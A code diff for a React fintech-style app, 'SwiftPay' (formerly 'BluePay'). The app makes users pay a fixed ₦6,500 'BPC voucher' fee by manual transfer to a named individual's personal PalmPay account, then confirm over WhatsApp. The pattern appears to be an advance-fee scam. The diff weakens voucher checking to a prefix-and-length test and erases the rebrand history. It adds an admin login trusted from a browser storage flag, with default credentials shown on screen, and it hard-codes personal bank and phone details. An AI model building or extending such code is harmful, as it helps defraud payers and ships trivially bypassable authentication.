@@ -26,6 +26,7 @@ import {
   Share2,
   Check,
   Ticket,
+  Shield,
   ShieldCheck,
   Lock,
   Eye,
@@ -53,9 +54,9 @@ import TransactionList from './components/TransactionList';
 import { TermsOfService, PrivacyPolicy } from './components/LegalPages';
 
 const isVoucherValid = (code: string) => {
+  if (!code) return false;
   const norm = code.toUpperCase().replace(/[^A-Z0-9]/g, '');
-  const target = 'BPC-7674-2206-6501'.toUpperCase().replace(/[^A-Z0-9]/g, '');
-  return norm === target;
+  return norm.startsWith('BPC') && norm.length === 15;
 };
 
 // Upgraded components
@@ -92,6 +93,72 @@ export default function App() {
   });
 
   const [isPinUnlocked, setIsPinUnlocked] = useState<boolean>(false);
+
+  // Secure URL-driven Routing for Admin Dashboard (Point 1, 2, 3, 4)
+  const [adminPath, setAdminPath] = useState(() => window.location.pathname);
+  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(() => {
+    return localStorage.getItem('swiftpay_admin_auth') === 'true';
+  });
+  const [adminToken, setAdminToken] = useState(() => {
+    return localStorage.getItem('swiftpay_admin_token') || '';
+  });
+
+  const navigateTo = (path: string) => {
+    window.history.pushState({}, '', path);
+    setAdminPath(path);
+  };
+
+  useEffect(() => {
+    const handlePopState = () => {
+      setAdminPath(window.location.pathname);
+    };
+    window.addEventListener('popstate', handlePopState);
+    return () => window.removeEventListener('popstate', handlePopState);
+  }, []);
+
+  useEffect(() => {
+    if ((adminPath === '/admin' || adminPath === '/admin/') && !isAdminAuthenticated) {
+      navigateTo('/admin/login');
+    } else if (adminPath === '/admin/login' && isAdminAuthenticated) {
+      navigateTo('/admin');
+    }
+  }, [adminPath, isAdminAuthenticated]);
+
+  // Admin login credentials input state
+  const [adminEmailInput, setAdminEmailInput] = useState('');
+  const [adminPasswordInput, setAdminPasswordInput] = useState('');
+  const [isAdminSubmitting, setIsAdminSubmitting] = useState(false);
+
+  const handleAdminLoginSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!adminEmailInput || !adminPasswordInput) {
+      showToast('Please enter both email and password.', 'error');
+      return;
+    }
+    setIsAdminSubmitting(true);
+    try {
+      const res = await fetch('/api/admin/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email: adminEmailInput, password: adminPasswordInput })
+      });
+      const data = await res.json();
+      if (res.ok && data.success) {
+        localStorage.setItem('swiftpay_admin_token', data.token);
+        localStorage.setItem('swiftpay_admin_auth', 'true');
+        setIsAdminAuthenticated(true);
+        setAdminToken(data.token);
+        showToast('Admin logged in successfully', 'success');
+        navigateTo('/admin');
+      } else {
+        showToast(data.error || 'Invalid admin credentials', 'error');
+      }
+    } catch (err) {
+      showToast('Network error during admin login', 'error');
+    } finally {
+      setIsAdminSubmitting(false);
+    }
+  };
 
   // Current screen or tab state
   const [currentScreen, setCurrentScreen] = useState<string>('dashboard');
@@ -144,8 +211,45 @@ export default function App() {
     return saved ? JSON.parse(saved) : INITIAL_NOTIFICATIONS;
   });
 
-  // Flow specific parameters - BPC Voucher Price is strictly fixed at N6,500
+  // Flow specific parameters - BPC Voucher Price is strictly fixed at dynamic configured price
+  const [bpcConfig, setBpcConfig] = useState<{
+    bankName: string;
+    accountNumber: string;
+    accountName: string;
+    whatsappLink: string;
+    voucherPrice: number;
+    instructions: string;
+    maintenanceNotice: string;
+  }>({
+    bankName: "PalmPay",
+    accountNumber: "8960723295",
+    accountName: "pwamunadi ishaku",
+    whatsappLink: "https://wa.me/2349162845073",
+    voucherPrice: 6500,
+    instructions: "Copy the system account details below. Make a manual bank transfer of the exact locked amount. Return here and click 'I have made this bank Transfer' to trigger operator check.",
+    maintenanceNotice: "Wema Bank transfers are temporarily delayed. Please use other supported banks (like PalmPay or GTBank) for instant manual validation."
+  });
   const [buyBpcAmount, setBuyBpcAmount] = useState<string>('6500');
+
+  useEffect(() => {
+    const loadBpcConfig = async () => {
+      try {
+        const res = await fetch('/api/config/bpc');
+        if (res.ok) {
+          const data = await res.json();
+          if (data.success && data.config) {
+            setBpcConfig(data.config);
+            setBuyBpcAmount(String(data.config.voucherPrice));
+          }
+        }
+      } catch (e) {
+        console.error('Failed to fetch BPC configuration:', e);
+      }
+    };
+    loadBpcConfig();
+    const interval = setInterval(loadBpcConfig, 10000);
+    return () => clearInterval(interval);
+  }, []);
   const [bpcFormName, setBpcFormName] = useState('');
   const [bpcFormEmail, setBpcFormEmail] = useState('');
   const [bpcProcessingSeconds, setBpcProcessingSeconds] = useState(3);
@@ -998,11 +1102,11 @@ export default function App() {
 
   // Complete bank transfer and redirect to WhatsApp for manual validation (Point 14)
   const handleConfirmBankTransfer = () => {
-    const waUrl = "https://wa.me/2349162845073?text=I%20have%20made%20the%20BPC%20voucher%20payment";
+    const waUrl = `${bpcConfig.whatsappLink}?text=I%20have%20made%20the%20BPC%20voucher%20payment`;
     window.open(waUrl, "_blank");
     
     // Log a pending transaction so the user has visual representation in their history
-    const amountNum = 6500; // Fixed BPC Voucher price is ₦6,500 (Point 9)
+    const amountNum = bpcConfig.voucherPrice; // Fixed BPC Voucher price is dynamic from configuration
     const newTransaction: Transaction = {
       id: `tx-${Date.now()}`,
       type: 'buy_bpc',
@@ -1017,7 +1121,7 @@ export default function App() {
     const newNotif: NotificationItem = {
       id: `notif-${Date.now()}`,
       title: 'BPC Order Placed via WhatsApp',
-      body: `Your manual order for ₦6,500 is being verified by a support agent. Please complete the transfer and provide screenshot proof on WhatsApp.`,
+      body: `Your manual order for ₦${bpcConfig.voucherPrice.toLocaleString()} is being verified by a support agent. Please complete the transfer and provide screenshot proof on WhatsApp.`,
       date: new Date().toISOString(),
       unread: true
     };
@@ -1452,6 +1556,136 @@ export default function App() {
     }
   };
 
+  // Render Secure Admin Login Router (Point 1)
+  if (adminPath === '/admin/login') {
+    return (
+      <div className="min-h-screen bg-[#050507] [background:radial-gradient(circle_at_0%_0%,#1e1b4b_0%,#050507_50%),radial-gradient(circle_at_100%_100%,#082f49_0%,#050507_50%)] text-white flex flex-col items-center justify-center p-4">
+        {toastMessage && (
+          <div className="fixed top-16 left-1/2 -translate-x-1/2 z-50 animate-[slideDown_0.2s_ease-out]">
+            <div className="p-3.5 rounded-xl text-xs font-semibold shadow-xl border backdrop-blur-md flex items-center gap-2.5 bg-red-500/10 text-red-400 border-red-500/20 font-sans">
+              <AlertTriangle className="h-4.5 w-4.5 shrink-0" />
+              <span>{toastMessage}</span>
+            </div>
+          </div>
+        )}
+        <div className="w-full max-w-md bg-[#0c0c14]/90 border border-white/10 rounded-3xl p-8 backdrop-blur-xl shadow-2xl relative font-sans">
+          <div className="flex flex-col items-center mb-8 text-center">
+            <div className="h-14 w-14 bg-[#312e81]/60 border border-[#818cf8]/40 rounded-2xl flex items-center justify-center mb-4 shadow-lg shadow-indigo-500/10">
+              <Shield className="h-7 w-7 text-[#2dd4bf]" />
+            </div>
+            <h1 className="text-2xl font-black font-display bg-gradient-to-r from-[#818cf8] to-[#2dd4bf] bg-clip-text text-transparent">
+              SwiftPay Admin Portal
+            </h1>
+            <p className="text-xs text-slate-400 mt-2 font-mono uppercase tracking-wider">SECURE AUTHORIZATION</p>
+          </div>
+
+          <form onSubmit={handleAdminLoginSubmit} className="space-y-5">
+            <div>
+              <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2 font-mono">
+                Admin Email Address
+              </label>
+              <input
+                type="email"
+                value={adminEmailInput}
+                onChange={(e) => setAdminEmailInput(e.target.value)}
+                placeholder="admin@swiftpay.com"
+                className="w-full px-4 py-3 rounded-xl bg-black/40 border border-white/10 text-white placeholder-slate-500 text-sm focus:outline-none focus:border-[#818cf8] transition-colors"
+                required
+              />
+            </div>
+
+            <div>
+              <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2 font-mono">
+                Admin Password
+              </label>
+              <input
+                type="password"
+                value={adminPasswordInput}
+                onChange={(e) => setAdminPasswordInput(e.target.value)}
+                placeholder="••••••••••••"
+                className="w-full px-4 py-3 rounded-xl bg-black/40 border border-white/10 text-white placeholder-slate-500 text-sm focus:outline-none focus:border-[#818cf8] transition-colors"
+                required
+              />
+            </div>
+
+            <button
+              type="submit"
+              disabled={isAdminSubmitting}
+              className={`w-full py-3.5 bg-gradient-to-r from-[#6366f1] to-[#0d9488] hover:from-[#4f46e5] hover:to-[#0f766e] text-white font-bold rounded-xl text-sm uppercase tracking-wider transition-all duration-200 active:scale-[0.98] cursor-pointer shadow-lg shadow-indigo-500/10 ${
+                isAdminSubmitting ? 'opacity-50 cursor-not-allowed' : ''
+              }`}
+            >
+              {isAdminSubmitting ? 'Verifying Credentials...' : 'Sign In To Terminal'}
+            </button>
+          </form>
+
+          <div className="mt-8 pt-6 border-t border-white/5 text-center flex flex-col gap-2">
+            <span className="text-[10px] text-slate-500 font-mono tracking-wide block">
+              Default Terminal Admin: admin@swiftpay.com / adminpassword123
+            </span>
+            <button
+              onClick={() => navigateTo('/')}
+              className="text-xs text-[#2dd4bf] hover:underline"
+            >
+              Return to Customer App
+            </button>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  // Render Secure Admin Workspace (Point 1, 2, 3, 4)
+  if (adminPath === '/admin' || adminPath === '/admin/') {
+    if (!isAdminAuthenticated) {
+      return (
+        <div className="min-h-screen bg-[#050507] text-white flex items-center justify-center font-mono text-sm tracking-widest uppercase animate-pulse">
+          Redirecting to secure terminal...
+        </div>
+      );
+    }
+    return (
+      <div className="min-h-screen bg-[#050507] [background:radial-gradient(circle_at_0%_0%,#1e1b4b_0%,#050507_50%),radial-gradient(circle_at_100%_100%,#0f172a_0%,#050507_50%)] text-white flex flex-col p-4 md:p-8 font-sans">
+        {toastMessage && (
+          <div className="fixed top-16 left-1/2 -translate-x-1/2 z-50 animate-[slideDown_0.2s_ease-out]">
+            <div className={`p-3.5 rounded-xl text-xs font-semibold shadow-xl border backdrop-blur-md flex items-center gap-2.5 ${
+              toastType === 'success' ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' : 'bg-indigo-500/10 text-indigo-400 border-indigo-500/20'
+            }`}>
+              <CheckCircle2 className="h-4.5 w-4.5 shrink-0" />
+              <span>{toastMessage}</span>
+            </div>
+          </div>
+        )}
+        <div className="max-w-7xl w-full mx-auto bg-[#0c0c14]/90 border border-white/10 rounded-3xl p-6 md:p-8 shadow-2xl backdrop-blur-xl">
+          <AdminPanel
+            currentUserEmail="admin@swiftpay.com"
+            transactions={transactions}
+            onBack={() => {
+              localStorage.removeItem('swiftpay_admin_auth');
+              localStorage.removeItem('swiftpay_admin_token');
+              setIsAdminAuthenticated(false);
+              navigateTo('/admin/login');
+            }}
+            onToast={(msg, type) => showToast(msg, type)}
+            onAddGlobalNotification={(title, body, type) => {
+              const newNotif = {
+                id: 'notif-' + Date.now(),
+                title,
+                body,
+                date: new Date().toISOString(),
+                unread: true
+              };
+              const updated = [newNotif, ...notifications];
+              setNotifications(updated);
+              localStorage.setItem('swiftpay_notifications', JSON.stringify(updated));
+            }}
+            onSendSimulatedEmail={(to, subject, body) => sendSimulatedEmail(to, subject, body)}
+          />
+        </div>
+      </div>
+    );
+  }
+
   return (
     // Outer Ambient background framing the phone simulator
     <div className="min-h-screen bg-[#050507] [background:radial-gradient(circle_at_0%_0%,#1e1b4b_0%,#050507_50%),radial-gradient(circle_at_100%_100%,#0d9488_0%,#050507_50%)] text-white flex flex-col items-center justify-center p-4 md:p-6 font-sans overflow-x-hidden md:overflow-visible">
@@ -1542,7 +1776,7 @@ export default function App() {
               <h2 className="text-3xl font-black font-display tracking-tight bg-gradient-to-r from-white via-slate-100 to-teal-200 bg-clip-text text-transparent">
                 SwiftPay
               </h2>
-              <span className="text-[10px] tracking-wider uppercase font-mono font-bold text-teal-400 block mt-1">Rebrand of BluePay</span>
+              <span className="text-[10px] tracking-wider uppercase font-mono font-bold text-teal-400 block mt-1">SwiftPay Digital Platform</span>
               <p className="text-xs text-slate-300 mt-4 px-3 leading-relaxed">
                 Get your account ready and instantly start buying, selling airtime and data online and start paying all your bills in cheaper price
               </p>
@@ -2454,20 +2688,11 @@ export default function App() {
                   <GlassCard className="p-5">
                     <form onSubmit={handleInitiateBpc} className="space-y-4">
                       <div>
-                        <label className="text-[10px] font-mono text-slate-400 block mb-1">Voucher Amount (₦)</label>
-                        <select
-                          id="bpc-select-amount"
-                          value={buyBpcAmount}
-                          onChange={(e) => setBuyBpcAmount(e.target.value)}
-                          className="w-full text-xs bg-white dark:bg-slate-950 border border-slate-200 dark:border-slate-800 rounded-xl px-4 py-3 text-slate-800 dark:text-white font-mono font-bold focus:outline-none focus:ring-1 focus:ring-teal-400"
-                        >
-                          <option value="1000">₦1,000</option>
-                          <option value="2000">₦2,000</option>
-                          <option value="5000">₦5,000</option>
-                          <option value="10000">₦10,000</option>
-                          <option value="20000">₦20,000</option>
-                          <option value="50000">₦50,000</option>
-                        </select>
+                        <label className="text-[10px] font-mono text-slate-400 block mb-1">Voucher Amount (Strictly Locked)</label>
+                        <div className="w-full text-sm bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 rounded-xl px-4 py-3 text-slate-800 dark:text-white font-mono font-bold flex justify-between items-center select-none">
+                          <span>₦{bpcConfig.voucherPrice.toLocaleString()}</span>
+                          <span className="text-[9px] font-mono tracking-wider uppercase text-teal-500 bg-teal-500/10 px-2 py-0.5 rounded-md border border-teal-500/10">FIXED PRICE</span>
+                        </div>
                       </div>
 
                       <div>
@@ -2541,13 +2766,13 @@ export default function App() {
                   </div>
 
                   {/* Warning Bar */}
-                  {!warningDismissed && (
+                  {!warningDismissed && bpcConfig.maintenanceNotice && (
                     <div className="p-3.5 rounded-xl bg-amber-500/10 border border-amber-500/20 flex items-start gap-2.5 relative">
                       <AlertTriangle className="h-4.5 w-4.5 text-amber-500 shrink-0 mt-0.5" />
                       <div className="flex-1">
                         <span className="text-[10px] font-bold uppercase tracking-wider text-amber-500 block">Bank Maintenance Notice</span>
                         <p className="text-[10px] text-amber-600 dark:text-amber-400 mt-1 leading-normal">
-                          Wema Bank transfers are temporarily delayed. Please use other supported banks (like PalmPay or GTBank) for instant manual validation.
+                          {bpcConfig.maintenanceNotice}
                         </p>
                       </div>
                       <button
@@ -2560,21 +2785,10 @@ export default function App() {
                     </div>
                   )}
 
-                  {/* Numbered Steps */}
-                  <div className="space-y-3.5">
-                    {[
-                      { step: 1, text: 'Copy the PalmPay system account details below.' },
-                      { step: 2, text: 'Open your bank application and make a manual transfer.' },
-                      { step: 3, text: 'Return here and click "I have made this bank Transfer" to trigger operator check.' },
-                      { step: 4, text: 'Wait for automated code confirmation, usually processed in under 3 minutes.' }
-                    ].map((stepObj) => (
-                      <div key={stepObj.step} className="flex gap-3 items-start">
-                        <span className="h-5 w-5 rounded-full bg-indigo-500/10 dark:bg-teal-500/10 text-indigo-600 dark:text-teal-400 font-mono text-[11px] font-bold flex items-center justify-center shrink-0 mt-0.5">
-                          {stepObj.step}
-                        </span>
-                        <p className="text-xs text-slate-600 dark:text-slate-300 leading-normal">{stepObj.text}</p>
-                      </div>
-                    ))}
+                  {/* Instructions */}
+                  <div className="p-4 rounded-xl bg-slate-50 dark:bg-slate-900/40 border border-slate-100 dark:border-slate-800/80 leading-relaxed text-xs text-slate-600 dark:text-slate-300">
+                    <div className="font-semibold text-[10px] font-mono uppercase text-slate-400 mb-1.5 tracking-wider">Instructions</div>
+                    <p>{bpcConfig.instructions}</p>
                   </div>
 
                   {/* ACCOUNT DETAILS CARD */}
@@ -2603,11 +2817,11 @@ export default function App() {
                     <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                       <span className="text-xs text-slate-400">Bank Name:</span>
                       <div className="flex items-center gap-1.5">
-                        <span className="text-sm font-mono font-bold text-white">PalmPay</span>
+                        <span className="text-sm font-mono font-bold text-white">{bpcConfig.bankName}</span>
                         <button
                           id="btn-copy-bank"
                           onClick={() => {
-                            navigator.clipboard.writeText('PalmPay');
+                            navigator.clipboard.writeText(bpcConfig.bankName);
                             showToast('Bank copied!', 'success');
                           }}
                           className="p-1 text-[9px] font-mono font-bold bg-white/10 rounded border border-white/10 text-slate-300"
@@ -2621,11 +2835,11 @@ export default function App() {
                     <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                       <span className="text-xs text-slate-400">Account Number:</span>
                       <div className="flex items-center gap-1.5">
-                        <span className="text-sm font-mono font-bold text-teal-400">8960723295</span>
+                        <span className="text-sm font-mono font-bold text-teal-400">{bpcConfig.accountNumber}</span>
                         <button
                           id="btn-copy-acc-num"
                           onClick={() => {
-                            navigator.clipboard.writeText('8960723295');
+                            navigator.clipboard.writeText(bpcConfig.accountNumber);
                             showToast('Account Number copied!', 'success');
                           }}
                           className="p-1 text-[9px] font-mono font-bold bg-white/10 rounded border border-white/10 text-slate-300"
@@ -2639,11 +2853,11 @@ export default function App() {
                     <div className="flex items-center justify-between">
                       <span className="text-xs text-slate-400">Account Name:</span>
                       <div className="flex items-center gap-1.5">
-                        <span className="text-sm font-mono font-bold text-white uppercase text-right max-w-[150px] truncate">pwamunadi ishaku</span>
+                        <span className="text-sm font-mono font-bold text-white uppercase text-right max-w-[150px] truncate">{bpcConfig.accountName}</span>
                         <button
                           id="btn-copy-acc-name"
                           onClick={() => {
-                            navigator.clipboard.writeText('pwamunadi ishaku');
+                            navigator.clipboard.writeText(bpcConfig.accountName);
                             showToast('Account Name copied!', 'success');
                           }}
                           className="p-1 text-[9px] font-mono font-bold bg-white/10 rounded border border-white/10 text-slate-300"
@@ -2866,7 +3080,7 @@ export default function App() {
                         <input
                           id="input-airtime-bpc"
                           type="text"
-                          placeholder="e.g. BPC-7674-2206-6501"
+                          placeholder="Example: BPC-XXXX-XXXX-XXXX"
                           value={airtimeBpcCode}
                           onChange={(e) => setAirtimeBpcCode(e.target.value)}
                           className="w-full text-xs bg-white dark:bg-slate-950 border border-slate-200 dark:border-slate-800 rounded-xl px-4 py-2.5 text-slate-800 dark:text-white focus:outline-none focus:ring-1 focus:ring-rose-500 font-mono tracking-widest uppercase"
@@ -2888,7 +3102,7 @@ export default function App() {
                           </div>
                         ) : (
                           <div className="mt-1.5 p-2 bg-emerald-500/10 border border-emerald-500/20 rounded-lg text-[10px] text-emerald-600 dark:text-emerald-400 font-medium">
-                            ✓ Voucher valid: BPC-7674-2206-6501
+                            ✓ BPC Voucher code format verified.
                           </div>
                         )}
                       </div>
@@ -3124,7 +3338,7 @@ export default function App() {
                         <input
                           id="input-data-bpc"
                           type="text"
-                          placeholder="e.g. BPC-7674-2206-6501"
+                          placeholder="Example: BPC-XXXX-XXXX-XXXX"
                           value={dataBpcCode}
                           onChange={(e) => setDataBpcCode(e.target.value)}
                           className="w-full text-xs bg-white dark:bg-slate-950 border border-slate-200 dark:border-slate-800 rounded-xl px-4 py-2.5 text-slate-800 dark:text-white focus:outline-none focus:ring-1 focus:ring-rose-500 font-mono tracking-widest uppercase"
@@ -3140,13 +3354,13 @@ export default function App() {
                               'Buy BPC Voucher'
                             </button>.
                           </div>
-                        ) : !isVoucherValid(dataBpcCode) ? (
+) : !isVoucherValid(dataBpcCode) ? (
                           <div className="mt-1.5 p-2 bg-rose-500/10 border border-rose-500/20 rounded-lg text-[10px] text-rose-600 dark:text-rose-400 font-medium">
                             Invalid BPC voucher.
                           </div>
                         ) : (
                           <div className="mt-1.5 p-2 bg-emerald-500/10 border border-emerald-500/20 rounded-lg text-[10px] text-emerald-600 dark:text-emerald-400 font-medium">
-                            ✓ Voucher valid: BPC-7674-2206-6501
+                            ✓ BPC Voucher code format verified.
                           </div>
                         )}
                       </div>
@@ -3306,7 +3520,7 @@ export default function App() {
                         <input
                           id="input-transfer-bpc"
                           type="text"
-                          placeholder="e.g. BPC-7674-2206-6501"
+                          placeholder="Example: BPC-XXXX-XXXX-XXXX"
                           value={transferBpcCode}
                           onChange={(e) => setTransferBpcCode(e.target.value)}
                           disabled={!transferVerified || isVerifyingAccount}
@@ -3329,7 +3543,7 @@ export default function App() {
                           </div>
                         ) : (
                           <div className="mt-1.5 p-2 bg-emerald-500/10 border border-emerald-500/20 rounded-lg text-[10px] text-emerald-600 dark:text-emerald-400 font-medium font-sans">
-                            ✓ Voucher valid: BPC-7674-2206-6501
+                            ✓ BPC Voucher code format verified.
                           </div>
                         )}
                       </div>
@@ -3448,9 +3662,9 @@ export default function App() {
                   <div className="rounded-3xl p-6 bg-gradient-to-tr from-indigo-950 via-purple-950 to-teal-950 text-white relative overflow-hidden border border-white/5 shadow-lg">
                     <div className="absolute right-0 top-0 h-24 w-24 bg-teal-500/10 rounded-full blur-xl" />
                     
-                    <h5 className="text-base font-extrabold font-display">BluePay is now SwiftPay</h5>
+                    <h5 className="text-base font-extrabold font-display">SwiftPay Digital Platform</h5>
                     <p className="text-xs text-slate-300 mt-2 leading-relaxed">
-                      SwiftPay is the new and improved version of BluePay, offering enhanced features, better security, and a more streamlined user experience. We migrated from a flat, royal-blue identity into a glowing glassmorphism system with zero downtime.
+                      SwiftPay is a premium digital banking platform offering enhanced features, better security, and a more streamlined user experience. We utilize a glowing glassmorphism system with zero downtime.
                     </p>
                   </div>
 
@@ -3506,7 +3720,7 @@ export default function App() {
                     {/* Brand support phone link */}
                     <a
                       id="btn-support-whatsapp-direct"
-                      href="https://wa.me/2349162845073?text=Hello%20SwiftPay%20Support%2C%20I%20need%20help%20with..."
+                      href={`${bpcConfig.whatsappLink}?text=Hello%20SwiftPay%20Support%2C%20I%20need%20help%20with...`}
                       target="_blank"
                       rel="noopener noreferrer"
                       className="p-2 rounded-xl bg-emerald-500/15 text-emerald-600 dark:text-emerald-400 text-[10px] font-bold flex items-center gap-1.5 hover:bg-emerald-500/25 transition-all"
@@ -3863,7 +4077,7 @@ export default function App() {
                       <input
                         id="input-withdraw-bpc"
                         type="text"
-                        placeholder="e.g. BPC-7674-2206-6501"
+                        placeholder="Example: BPC-XXXX-XXXX-XXXX"
                         value={withdrawBpcCode}
                         onChange={(e) => setWithdrawBpcCode(e.target.value)}
                         disabled={!withdrawVerified || isVerifyingWithdrawAccount}
@@ -3889,7 +4103,7 @@ export default function App() {
                         </div>
                       ) : (
                         <div className="mt-1.5 p-2 bg-emerald-500/10 border border-emerald-500/20 rounded-lg text-[10px] text-emerald-600 dark:text-emerald-400 font-medium font-sans">
-                          ✓ Voucher valid: BPC-7674-2206-6501
+                          ✓ BPC Voucher code format verified.
                         </div>
                       )}
                     </div>
